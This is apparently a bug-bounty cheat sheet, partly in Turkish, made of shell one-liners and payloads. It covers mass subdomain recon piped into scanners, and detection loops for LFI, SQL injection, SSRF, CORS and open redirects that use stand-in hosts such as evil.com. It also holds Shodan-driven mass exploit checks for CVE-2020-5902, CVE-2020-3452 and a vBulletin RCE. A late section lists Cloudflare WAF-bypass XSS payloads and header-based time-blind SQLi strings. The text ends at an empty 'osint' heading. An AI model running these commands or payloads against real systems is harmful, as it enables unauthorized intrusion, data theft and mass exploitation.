curl "https://recon.dev/api/search?key=YOURAPIKEY&domain=target.com" |jq -r '.[].rawDomains[]' | sed 's/ //g' | anew |httpx -silent | xargs -I@ gospider -d 0 -s @ -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```

## Jaeles scan to bugbounty targets.
> @KingOfBugbounty
```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @
```
> @ofjaah
```bash
curl -s "https://jldc.me/anubis/subdomains/sony.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | httpx -silent -threads 300 | anew | rush -j 10 'jaeles scan -s /jaeles-signatures/ -u {}'
```

## Nuclei scan to bugbounty targets.
> @hack_fish
```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | httpx -silent | xargs -n 1 gospider -o output -s ; cat output/* | egrep -o 'https?://[^ ]+' | nuclei -t ~/nuclei-templates/ -o result.txt
```
> @ofjaah
```bash
amass enum -passive -norecursive -d https://target.com -o domain ; httpx -l domain -silent -threads 10 | nuclei -t nuclei-templates -o result -timeout 30
```

## Endpoints, by apks
> @ofjaaah
```bash
apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's#"##g' | anew | grep -v "w3\|android\|github\|http://schemas.android\|google\|http://goo.gl"
```

## Find Subdomains TakeOver
> hahwul
```bash
subfinder -d {target} >> domains ; assetfinder -subs-only {target} >> domains ; amass enum -norecursive -noalts -d {target} >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
```

## CORS Misconfiguration
> manas_hunter
```bash
site="https://example.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```

## SQL Injection
> @ofjaaah
```bash
findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
```

## Search SQLINJECTION using qsreplace search syntax error
> [KingOfBugbounty](https://github.com/KingOfBugbounty/KingOfBugBountyTips)
```bash
grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
```

## SQLi-TimeBased scanner
> @slv0d
```bash
gau DOMAIN.tld  | sed 's/=[^=&]*/=YOUR_PAYLOAD/g' | grep ?*= | sort -u | while read host;do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2;if (r >= TIME_OF_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ;done
```

## Recon to search SSRF Test
> [KingOfBugbounty](https://github.com/KingOfBugbounty/KingOfBugBountyTips)
```bash
findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://YOUR.burpcollaborator.net
```

## Using shodan & Nuclei
> [KingOfBugbounty](https://github.com/KingOfBugbounty/KingOfBugBountyTips)

Shodan is a search engine that lets the user find specific types of computers connected to the internet, AWK Cuts the text and prints the third column. httpx is a fast and multi-purpose HTTP using -silent. Nuclei is a fast tool for configurable targeted scanning based on templates offering massive extensibility and ease of use, You need to download the nuclei templates.
```bash
shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/
```

## Using Chaos to jaeles "How did I find a critical today?.
> [KingOfBugbounty](https://github.com/KingOfBugbounty/KingOfBugBountyTips)

To chaos this project to projectdiscovery, Recon subdomains, using httpx, if we see the output from chaos domain.com we need it to be treated as http or https, so we use httpx to get the results. We use anew, a tool that removes duplicates from @TomNomNom, to get the output treated for import into jaeles, where he will scan using his templates.
```bash
chaos -d domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @ 
```
edited **if we don't have chaos api_key**
```bash
cat domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s ~/Tools/jaeles-signatures -u @
```

## Check Blind ssrf in Header,Path,Host & check xss via web cache poisoning.
> @sratarun
```bash
cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotort'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotort'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotort'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.yourburpcollabrotort HTTP/1.1 ""\n";done\
```

### Local File Inclusion
> @dwisiswant0
```bash
gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

### Open-redirect
> @dwisiswant0
```bash
export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

## Directory Listing

### (Feroxbuster) common command
```bash
feroxbuster -u https://target.com --insecure -d 1 -e -L 4 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
```
### (Feroxbuster) Multiple values
> @epi052 or [feroxbuster](https://github.com/epi052/feroxbuster)
```bash
feroxbuster -u http://127.1 -x pdf -x js,html -x php txt json,docx
```
### (Feroxbuster) Read urls from STDIN; pipe only resulting urls out to another tool
> @epi052 or [feroxbuster](https://github.com/epi052/feroxbuster)
```bash
cat targets | ./feroxbuster --stdin --silent -s 200 301 302 --redirects -x js | fff -s 200 -o js-files
```

# search javascript file
> @ofjaaah
```bash
gau -subs DOMAIN |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt
```

# Uncover
>  [projectdiscovery/uncover](https://github.com/projectdiscovery/uncover)
```bash
uncover -q http.title:"GitLab" -silent | httpx -silent | nuclei
uncover -q target -f ip | naabu
echo jira | uncover -e shodan,censys -silent
```
> @ofjaah
```bash
uncover -q 'org:"DoD Network Information Center"' | httpx -silent | nuclei -silent -severity low,medium,high,critical
```

# Find admin login
> @0x_rood
```bash
cat domains_list.txt | httpx -ports 80,443,8080,8443 -path /admin -mr "admin"
```

# 403 login Bypass
> @_bughunter
```bash
cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent
```

# Recon Parameters
```bash
echo tesla.com | subfinder -silent | httpx -silent | cariddi -intensive
```



















## Definitions

This section defines specific terms or placeholders that are used throughout one-line command/scripts.

- 1.1. "**HOST**" defines one hostname, (sub)domain, or IP address, e.g. replaced by `internal.host`, `domain.tld`, `sub.domain.tld`, or `127.0.0.1`.
- 1.2. "**HOSTS.txt**" contains criteria 1.1 with more than one in file.
- 2.1. "**URL**" definitely defines the URL, e.g. replaced by `http://domain.tld/path/page.html` or somewhat starting with HTTP/HTTPS protocol.
- 2.2. "**URLS.txt**" contains criteria 2.1 with more than one in file.
- 3.1. "**FILE.txt**" or "**FILE**`{N}`**.txt**" means the files needed to run the command/script according to its context and needs.
- 4.1. "**OUT.txt**" or "**OUT**`{N}`**.txt**" means the file as the target storage result will be the command that is executed.

---

### Local File Inclusion
> @dwisiswant0

```bash
gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

### Open-redirect
> @dwisiswant0

```bash
export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

> @N3T_hunt3r
```bash
cat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
```

### XSS
> @cihanmehmet

```bash
gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt
```

> @fanimalikhack

```bash
waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt
```

> @oliverrickfors

```bash
cat HOSTS.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"
```

### Prototype Pollution
> @R0X4R

```bash
subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```

### CVE-2020-5902
> @Madrobot_

```bash
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
```

### CVE-2020-3452
> @vict0ni

```bash
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt
```

### CVE-2022-0378
> @7h3h4ckv157

```bash
cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
```

### vBulletin 5.6.2 - 'widget_tabbedContainer_tab_panel' Remote Code Execution
> @Madrobot_

```bash
shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;
```

### Find JavaScript Files
> @D0cK3rG33k

```bash
assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done
```

### Extract Endpoints from JavaScript
> @renniepak

```bash
cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```

### Get CIDR & Org Information from Target Lists
> @steve_mcilwain

```bash
for HOST in $(cat HOSTS.txt);do echo $(for ip in $(dig a $HOST +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; d
one | uniq); done
```

### Get Subdomains from RapidDNS.io
> @andirrahmani1

```bash
curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | sort -u
```

### Get Subdomains from BufferOver.run
> @\_ayoubfathi\_

```bash
curl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u
```

> @AnubhavSingh_
```bash
export domain="HOST"; curl "https://tls.bufferover.run/dns?q=$domain" | jq -r .Results'[]' | rev | cut -d ',' -f1 | rev | sort -u | grep "\.$domain"
```

### Get Subdomains from Riddler.io
> @pikpikcu

```bash
curl -s "https://riddler.io/search/exportcsv?q=pld:HOST" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```

### Get Subdomains from VirusTotal
> @pikpikcu

```bash
curl -s "https://www.virustotal.com/ui/domains/HOST/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```

### Get Subdomain with cyberxplore
> @pikpikcu

```
curl https://subbuster.cyberxplore.com/api/find?domain=HOST -s | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" 
```

### Get Subdomains from CertSpotter
> @caryhooper

```bash
curl -s "https://certspotter.com/api/v1/issuances?domain=HOST&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```

### Get Subdomains from Archive
> @pikpikcu

```bash
curl -s "http://web.archive.org/cdx/search/cdx?url=*.HOST/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
```

### Get Subdomains from JLDC
> @pikpikcu

```bash
curl -s "https://jldc.me/anubis/subdomains/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```

### Get Subdomains from securitytrails
> @pikpikcu

```bash
curl -s "https://securitytrails.com/list/apex_domain/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u
```

### Bruteforcing Subdomain using DNS Over 
> @pikpikcu

```
while read sub; do echo "https://dns.google.com/resolve?name=$sub.HOST&type=A&cd=true" | parallel -j100 -q curl -s -L --silent  | grep -Po '[{\[]{1}([,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]|".*?")+[}\]]{1}' | jq | grep "name" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u ; done < FILE.txt
```

### Get Subdomains With sonar.omnisint.io
> @pikpikcu

```
curl --silent https://sonar.omnisint.io/subdomains/HOST | grep -oE "[a-zA-Z0-9._-]+\.HOST" | sort -u 
```

### Get Subdomains With synapsint.com
> @pikpikcu

```
curl --silent -X POST https://synapsint.com/report.php -d "name=https%3A%2F%2FHOST" | grep -oE "[a-zA-Z0-9._-]+\.HOST" | sort -u 
```

### Get Subdomains from crt.sh
> @vict0ni

```bash
curl -s "https://crt.sh/?q=%25.HOST&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```

### Sort & Tested Domains from Recon.dev
> @stokfedrik

```bash
curl "https://recon.dev/api/search?key=apikey&domain=HOST" |jq -r '.[].rawDomains[]' | sed 's/ //g' | sort -u | httpx -silent
```

### Subdomain Bruteforcer with FFUF
> @GochaOqradze

```bash
ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep "| URL |" | awk '{print $4}'
```

### Find Allocated IP Ranges for ASN from IP Address
> wains.be

```bash
whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net IP | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n
```

### Extract IPs from a File
> @emenalf

```bash
grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt
```

### Ports Scan without CloudFlare
> @dwisiswant0

```bash
subfinder -silent -d HOST | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe
```

### Create Custom Wordlists
> @tomnomnom

```bash
gau HOST | unfurl -u keys | tee -a FILE1.txt; gau HOST | unfurl -u paths | tee -a FILE2.txt; sed 's#/#\n#g' FILE2.txt | sort -u | tee -a FILE1.txt | sort -u; rm FILE2.txt  | sed -i -e 's/\.css\|\.png\|\.jpeg\|\.jpg\|\.svg\|\.gif\|\.wolf\|\.bmp//g' FILE1.txt
```

```bash
cat HOSTS.txt | httprobe | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a FILE.txt  
```

### Extracts Juicy Informations
> @Prial Islam Khan

```bash
for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a OUT.txt  ;done
```

### Find Subdomains TakeOver
> @hahwul

```bash
subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
```

### Dump Custom URLs from ParamSpider
> @hahwul

```bash
cat HOSTS.txt | xargs -I % python3 paramspider.py -l high -o ./OUT/% -d %;
```

### URLs Probing with cURL + Parallel
> @akita_zen

```bash
cat HOSTS.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
```

### Dump In-scope Assets from `chaos-bugbounty-list`
> @dwisiswant0

```bash
curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'
```

### Dump In-scope Assets from `bounty-targets-data`
> @dwisiswant0

#### HackerOne Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'
```

#### BugCrowd Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

#### Intigriti Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/intigriti_data.json | jq -r '.[].targets.in_scope[] | [.endpoint, .type] | @tsv'
```

#### YesWeHack Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/yeswehack_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

#### HackenProof Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/hackenproof_data.json | jq -r '.[].targets.in_scope[] | [.target, .type, .instruction] | @tsv'
```

#### Federacy Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/federacy_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

### Dump URLs from sitemap.xml
> @healthyoutlet

```bash
curl -s http://HOST/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'
```

### Pure Bash Linkfinder
> @ntrzz

```bash
curl -s $1 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort | uniq | grep ".js" > FILE.txt; while IFS= read link; do python linkfinder.py -i "$link" -o cli; done < FILE.txt | grep $2 | grep -v $3 | sort -n | uniq; rm -rf FILE.txt
```

### Extract Endpoints from swagger.json
> @zer0pwn

```bash
curl -s https://HOST/v2/swagger.json | jq '.paths | keys[]'
```

### CORS Misconfiguration
> @manas_hunter

```bash
site="URL"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on "$url"; fi; done
```

### Find Hidden Servers and/or Admin Panels
> @rez0__

```bash
ffuf -c -u URL -H "Host: FUZZ" -w FILE.txt 
```

### Recon Using api.recon.dev
> @z0idsec

```bash
curl -s -w "\n%{http_code}" https://api.recon.dev/search?domain=HOST | jg .[].domain
```

### Find Live Host/Domain/Assets
> @_YashGoti_

```bash
subfinder -d HOST -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u
```

### XSS without gf
> @HacktifyS

```bash
waybackurls HOST | grep '=' | qsreplace '<ScRiPt>alert(document.domain)</ScRiPt>' | while read host do ; do curl -sk --path-as-is "$host" | grep -qs "<ScRiPt>alert(document.domain)</ScRiPt>" && echo "$host is vulnerable"; done
```

### Get Subdomains from IPs
> @laughface809

```bash
python3 hosthunter.py HOSTS.txt > OUT.txt
```

### Gather Domains from Content-Security-Policy
> @geeknik

```bash
curl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u
```

### Nmap IP:PORT Parser Piped to HTTPX
> @dwisiswant0

```bash
nmap -v0 HOST -oX /dev/stdout | jc --xml -p | jq -r '.nmaprun.host | (.address["@addr"] + ":" + .ports.port[]["@portid"])' | httpx --silent
```

common crawl ile url leri topla
```bash
cat httpx.txt | xargs -I % sh -c 'curl -s \"https://index.commoncrawl.org/CC-MAIN-2024-39-index?url=%&output=json\" >> common_crawl.txt
```

nuclei 
```bash
nuclei -l httpx.txt -nmhe -o nucleitemplates_results.txt -me nucleitemplatesreport -stats -si 1800 -cloud-upload 
nuclei -l httpx.txt -nmhe -t ~/Documents/Nuclei-Templates-Collection/**/ -o emadshanab_nuclei.txt -me emadshanabReport -stats -si 1800 -cloud-upload
nuclei -l httpx.txt -nmhe -t ~/Documents/cent-nuclei-templates/ -o cent_nuclei.txt -me CentReport -stats -si 1800 -cloud-upload
```

open redirect google dork
```
site:example.net inurl:continue= | inurl:redirect | inurl:url= | inurl:return= | inurl:next= | inurl:callback= | inurl:redirect_uri= | inurl:redirect_url= | inurl:dest= | inurl:destination= | inurl:go= | inurl:forward= | nav=
```

open redirect 
```bash
cat wayback.txt | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I | grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
```
```bash
waybackurls testphp.vulnweb.com | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I | grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
```

varolan url listesi  ile 
```bash
#!/bin/bash

# SQL Injection için potansiyel URL'ler
grep -E "(\?id=|\?page=|\?user=|\?item=|\?product=|\?cat=|\?category=|\?query=|\?search=|\?value=|\?ref=|\?rid=|\?pid=|\?uid=|\?fid=|\?token=)" wayback.txt > sql_injection_urls.txt

# XSS için potansiyel URL'ler
grep -E "(\?q=|\?search=|\?s=|\?keyword=|\?input=|\?input_value=|\?message=|\?text=|\?data=)" wayback.txt > xss_urls.txt

# LFI/RFI için potansiyel URL'ler
grep -E "(\?file=|\?path=|\?dir=|\?action=download|\?include=|\?template=|\?filename=|\?file_path=|\?view=|\?src=|\?url=|\?link=)" wayback.txt > lfi_urls.txt

# Admin ve kritik dosyalar için URL'ler
grep -E "(/admin|/login|/dashboard|/config|/upload|/phpinfo\.php|/debug|/secret\.php|/test\.php|/api\.php|/admin\.php|/index\.php|/config\.php|/setup\.php|/install\.php|/readme\.txt|/license\.txt)" wayback.txt > admin_critical_urls.txt

echo "SQL Injection URL'leri: sql_injection_urls.txt"
echo "XSS URL'leri: xss_urls.txt"
echo "LFI/RFI URL'leri: lfi_urls.txt"
echo "Admin ve kritik dosya URL'leri: admin_critical_urls.txt"

```


commoncrawl ile urls get
```bash
# WARC dosyalarını indir
wget -r -np -nH --cut-dirs=3 -A.gz https://data.commoncrawl.org/crawl-data/CC-MAIN-2024-38/segments/<SEGMENT_ID>/warc/
# WARC dosyalarındaki doctolib.fr URL'lerini ayıklama
zcat *.warc.gz | grep -oP 'https?://[^ ]*doctolib\.fr[^ ]*' | sort -u > doctolib_urls.txt

```

### 1. Polyglot Payload Kullanımı:

Bazı payload'lar, hem HTML, hem JavaScript, hem de CSS bağlamlarında çalışabilen poliglotlar olabilir. Bu tür payload'lar, WAF'ın algılamasını zorlaştırabilir. Örneğin:

```html

"><img src=x onerror=alert(1)>
```
veya

```html

"><svg onload=alert(1)>
```
Bu payload'lar, HTML'nin içinde olduğu gibi çalışır ve JavaScript veya başka bir davranışı tetikleyebilir.

### 2. Zincirleme (Chained) Payload Kullanımı:

Bazen, tek bir payload yeterince etkili olamayabilir. Farklı karakterlerden kaçan bir dizi payload'u ardı ardına zincirleme kullanmak, WAF'ı atlatabilir.

Örnek:

```html

"><svg/onload=confirm(1)>
```
Bunun gibi zincirleme teknikler kullanarak, filtrelerin karakter dizilerini yanlış anlamasını sağlayabilirsiniz.


### 3. Event Handlers ile Oynama:

Cloudflare WAF bazı belirgin JavaScript kodlarını engelleyebilir, ancak daha az yaygın olan veya daha karmaşık event handler'ları gözden kaçırabilir. Bu durumda, JavaScript event handler'larıyla çalışarak saldırıyı bypass edebilirsiniz.

Örnek:

```html

"><input autofocus onfocus=alert(1)>
```
Bu input elementi odaklandığında bir alert tetikleyebilir.

### 4. Obfuscation ve Unicode Kullanımı:

Obfuscation teknikleriyle, XSS payload'unuzu WAF'den saklayabilirsiniz. Örneğin, JavaScript'in farklı karakter setleri veya Unicode kullanarak çalışmasını sağlayabilirsiniz:

```html

<svg onload=\u0061\u006c\u0065\u0072\u0074(1)>
```
Bu payload, Unicode escape karakterleri kullanılarak kodu gizler, ancak tarayıcı bunu JavaScript olarak çalıştırır.

### 5. Nested Encoding Kullanımı:

Bazı sistemler, sadece yüzeysel encoding işlemlerini çözerler ve iç içe geçmiş encoding'leri göz ardı ederler. WAF'i atlatmak için nested encoding ile saldırıyı gizleyebilirsiniz.

Örneğin, XSS payload'unuzu hem HTML, hem JavaScript, hem de URL encoding kullanarak saklayabilirsiniz:

```html

%253Cscript%253Ealert%25281%2529%253C/script%253E
```
Ancak bu yöntemin WAF'den geçip geçmediğini denemek gerekir, çünkü bazı WAF'ler bu tür yaklaşımları algılayabilir.


### 6. CSS Tabanlı XSS:

Bazı sistemlerde, CSS kodu üzerinden XSS saldırıları gerçekleştirilebilir. Bu, WAF'ler tarafından nadiren kontrol edilen bir vektör olabilir.

```css

body {background-image: url("javascript:alert(1)");}
```
Veya CSS injection ile:

```html

<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)">
```

### 7. JSON Injection Üzerinden XSS:

Cloudflare WAF gibi sistemler, doğrudan HTML veya JavaScript manipülasyonlarını engellese de, bazı durumlarda JSON payload'ları göz ardı edebilir. Eğer sistem JSON verileri parse ediyor ve bu veriler herhangi bir HTML çıktısına yansıyorsa, bunu kullanarak XSS gerçekleştirebilirsiniz.


### 8. URL Scheme Manipulation:

Bazı WAF'ler javascript: gibi URL protokollerini engeller, ancak data: veya vbscript: gibi alternatif protokolleri gözden kaçırabilir. Deneyebileceğiniz bir alternatif:
```javascript
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click me</a>
```
Bu örnekte, data: URL'si base64 ile kodlanmış bir XSS payload içeriyor. Tarayıcı bunu çözer ve JavaScript'i çalıştırır.


### 9. DOM Tabanlı XSS Denemesi:

WAF'ler genellikle sunucu tarafında çalıştığından, bazı DOM tabanlı XSS teknikleri gözden kaçabilir. Özellikle, kullanıcı inputlarının doğrudan DOM'da işlendiği yerlerde DOM tabanlı XSS'yi deneyebilirsiniz.

Örneğin, URL parametreleri kullanarak DOM'da manipülasyon yapabileceğiniz bir senaryoyu hedefleyebilirsiniz:

```javascript

<script>
    var user_input = window.location.hash.substring(1);
    document.write("<h1>" + user_input + "</h1>");
</script>
```


### cloudflare xss bypass payloads
```javascript

<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
<button%20popovertarget=x>Click%20me</button><img%20onbeforetoggle=alert(1)%20popover%20id=x>XSS
<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
Alternative Characters
javascript:alert(1)
<scrīpt>alert(1)</scrīpt>   

+ADw-script+AD4-alert(1)+ADw-/script+AD4-

DOM Based XSS
'; alert(1);// 
    &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

Adobe PDF JavaScript
app.alert(1);
app.alert("XSS çalıştı!");

Comment Injection
<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>



asdfadadada javascript:alert(1)javascript%3aalert(%2fhello+world%2f)%3b%2f%2f"&amp;gt;&amp;lt;img src=x onerror=prompt(document.domain);&amp;gt;%2F"'%2F><ScRiPt>alert(document.cookie)<%2FScRiPt>
```


header based sqli and xss
```
X-Forwarded-Host: evil.com"><img src/onerror=prompt(document.cookie)>

X-Forwarded-Host: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z  

X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z

Referer: https://site.com/'+(select*from(select(sleep(10)))a)+'

Cookie: 'XOR(if(now()=sysdate(),sleep(10),0))XOR'

User-Agent: "XOR(if(now()=sysdate(),sleep(10),0))XOR"
```


# osint
```bash
